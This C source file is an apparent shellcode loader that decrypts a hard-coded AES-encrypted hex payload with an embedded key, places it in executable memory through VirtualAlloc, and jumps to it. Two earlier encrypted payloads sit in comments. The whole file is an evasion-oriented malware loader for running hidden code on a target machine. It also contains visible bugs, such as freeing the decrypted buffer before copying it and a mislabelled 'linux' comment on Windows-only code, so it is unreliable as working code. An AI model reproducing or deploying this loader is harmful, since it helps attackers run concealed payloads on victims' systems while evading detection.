// Shellcode loader big version (linux one)

#include <winsock2.h>
#include "windows.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#define KEY_SIZE 16
#define IV_SIZE 16
#define CODE_SIZE 920
//#define FILE_SIZE 500

//char *extract_file(char *fitem);
unsigned char *aes_decrypt(char *hex_ciphertext, char *aes_key_hex, int *plaintext_len);

int main() {
  // Initialize sockets on windows systems
  WORD wVersionRequested;
  WSADATA wsadata;

  wVersionRequested = MAKEWORD(2, 2);
  if (WSAStartup(wVersionRequested, &wsadata) < 0) {
    printf("Startup failed");
    exit(1);
  }
  //char *code = "36ba4743cbc398cfb0b7ce04813830998db60dafc820323380049bf6f54a2c6e576e07cac10121b0b8a3b82c79d608d90648409fdb068dc4275050b963b51da86815e49bb988b4b3c08d16e12c4a995a9b9027b8de5f8a48325daed8e9665de70d799a83741f67b441239e9398cd3ae61b68396840fd7ff60966e4d4befc1465fd94b6021a5d07ec62efeb8fe90fc268f01f7503a965499080b491bf5a471e78c8dbfe83924eada76c2e51958ab09459e55ddec7299a97b07ac0e47af0a5559c50d3c104f9050ee57950c506abbd7d8b40d7b3207f594d9ddbaa69e897cfce7e17798633d1ceefe0b7b2aa2e43d99b3b0055e96bdff6d9193439c728281fe51ffe797b64a2c3a7fede39eaac83746cc65adb17a58da72d5d39b6f16819a297c0cac5c404a104ff7e52f81f922c7ea59b09369a97ea5b6906d7a69b619610dc02c74424bdeb103d1c82f6158995eba6350dc08ec37bbbce0dd6ccecea94c39d82046aa8c1cdba84d84d8822f73e258a85c5ec88a383c6e6f61a71b7e5c4189c8e30422862e0c692c4351b77ec8932f988ebd8e30f838edec5274bb8e595cdab48edf07d9ba5a42e71d78b541c65d8d267930dfaf3ecc70c042ab9c076a2fed6c8858c997af73d5c20fe3442030b58b402e0e63c423fdf9fa57add90dcd4f2053a";
//  char *code = "757cb8834d444cbdca7e34ba05e6401232aee0a1eec15c445940263e1689910d4d7c5918c6ddbd0c9998852dc1aa372095088b7ae4d4f0dfdc98bdaff21a5ed509650781ea873acd76ead473e04a43347a5511bacc760f566b0a1705a45d8a81a646e51f26549f3728f9e7a6fe05eaf1fef40269cd05d89c0e4e6a63f819adee2b5c4bff99dd6fd0eed8632ede1639503621d6ef52b609e50bb89b17ad4373de7ccc7fb57ac39dd54b47e2a2b00531a2d5f7c570feb31edc371cd7bb51f94f537381b8e8a3e5d6f91a960d8155d5138c98297a81bbb0858ed8e177a95e4f66b2ce630a1a75d628b1e39fec757e7a5521be228b4e62f31aa341149127d8c872ea5453c8d4080d25856dc7024db8da631b91970d700ea98b93ced4f1c4b4b256de03324a9fe366a438255096973275a9182c0f53fccd815b07f69f9c766676989a15f46c095e1f892e5ba285d3c28aadecc9e9bca14219ce0b5d0f2059a43dbe98ddfa93fada302493f24b3151a170e6dfec1c7301ed20a5eb855f716fb306f0a29c8383f65589b57eafa8b69c106c925fd5434d29de84f221423cc96a6cdd369ee7eeb68e1ad4a0a760c60bbb34c90bf59cd6839b1939e9d509ff42ff539c73075fdcbddaf851536254479f58cfb3784778ab61600012ddf7466ec6f59b40002d";
  char *code = "e2b3aae965f3ee55a2ab359fa07365f78680405b7df1cf83c0e9a476327c6a0bbded700166869ad02982fb5fe2978f880d6b26cbb4b497bb2cde4b9d143c0fed943073ebccb4b9011fecd1d0b683862ce4a3dae50149c513bba313a052f41923147d3390204f480e3103fca64ec8141ba9019d2e43b951f037c110779980218acf2a5937dae6c79b0f2921cd400e5ad88a61d383cd4ef02d4aa57ec2d17f853ca287fe0535ff3d52903db59a9e1b70aef03856b283001b1001a30451fa1c0105c9b3ed61ca8e95b7c7f7c198cf0169e898ee4f70213c00730884a12520e3ca38388336aee644e1f24fd99e082508abcfb871cda8b1fb23d4f9f4eff3da60c801479e2ed7d477194b333bda7a9fdb7f4f4494e248f66e9f15476eadd34bb068ec88371e6b87d6cf9f875b660d4217eb7b89d899e8a0536c9f5c72a166119c963b69c2a66f168978c75fa30d287a7ee686ed23c679b0dc2f489a0fc006a9fe57fd5e87bcdbf524b4f9f0673cba53b8c8f3beabb8d4c0445f15b9bb218d1b311f0588ce5c9ab24aa14986ae1eccde949e05db616741204e9af525c51a17c5dd02cd5877f4bd400cd3de53fd2fee047be1abae384003d4d782baca45989f087ad91e4da9465b2f46ca72e40c89954d06b460c01e5f971c3d82ec6d6d43d1d4c05131";
  char *key = "5369787465656e2062797465206b6579";
  int plaintext_len;

  unsigned char *plaintext = aes_decrypt(code, key, &plaintext_len);

  for (int i = 0; i < CODE_SIZE; i++)
    printf("\\%c", plaintext[i]);
  free(plaintext);

  void *exec_mem = VirtualAlloc(0, sizeof plaintext, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

  if (exec_mem == NULL) {
    fprintf(stderr, "VirtualAlloc failed\n");
    exit(1);
  }

  RtlMoveMemory(exec_mem, plaintext, CODE_SIZE);
  ((void(*)())exec_mem)();
  return 0;
}

/*char *extract_file(char *fitem) {
  FILE *fopen(), *fp;
  static char item[FILE_SIZE];
  if ((fp = fopen(fitem, "r")) == NULL) {
    fprintf(stderr, "Error, opening file\n");
    exit(1);
  }
  while (!feof(fp))
    fgets(item, FILE_SIZE, fp);
  fclose(fp);
  return item;
}*/

unsigned char *aes_decrypt(char *ciphertext_hex, char *aes_key_hex, int *plaintext_len) {
  EVP_CIPHER_CTX *ctx;
  unsigned char *ciphertext;
  unsigned char *plaintext;
  unsigned char aes_key[KEY_SIZE];
  unsigned char iv[IV_SIZE];
  int len, total_len;
  int ciphertext_len = strlen(ciphertext_hex) / 2;

  for (int i = 0; i < KEY_SIZE ; i++) {
    sscanf(aes_key_hex + (i * 2), "%2hhx", &aes_key[i]);
  }

  ciphertext = malloc(ciphertext_len);
  if (ciphertext == NULL) {
    fprintf(stderr, "Error allocating memory\n");
    exit(1);
  }

  for (int i = 0; i < ciphertext_len; i++) {
    sscanf(ciphertext_hex + (i * 2), "%2hhx", &ciphertext[i]);
  }

  memcpy(iv, ciphertext, IV_SIZE);

  unsigned char *encrypted_data = ciphertext + IV_SIZE;
  int encrypted_data_len = ciphertext_len - IV_SIZE;

  plaintext = malloc(encrypted_data_len + AES_BLOCK_SIZE);
  if (plaintext == NULL) {
    fprintf(stderr, "Error allocating memory\n");
    exit(1);
  }

  ctx = EVP_CIPHER_CTX_new();
  if (ctx == NULL) {
    fprintf(stderr, "Error initializing cipher context\n");
    exit(1);
  }

  if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, aes_key, iv) != 1) {
    fprintf(stderr, "Error initializing decryption\n");
    exit(1);
  }

  if (EVP_DecryptUpdate(ctx, plaintext, &len, encrypted_data, encrypted_data_len) != 1) {
    fprintf(stderr, "Error during decryption\n");
    exit(1);
  }
  total_len = len;

  if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
    fprintf(stderr, "Error during final decryption\n");
    exit(1);
  }
  total_len += len;

  *plaintext_len = total_len;

  EVP_CIPHER_CTX_free(ctx);
  free(ciphertext);

  return plaintext;
}
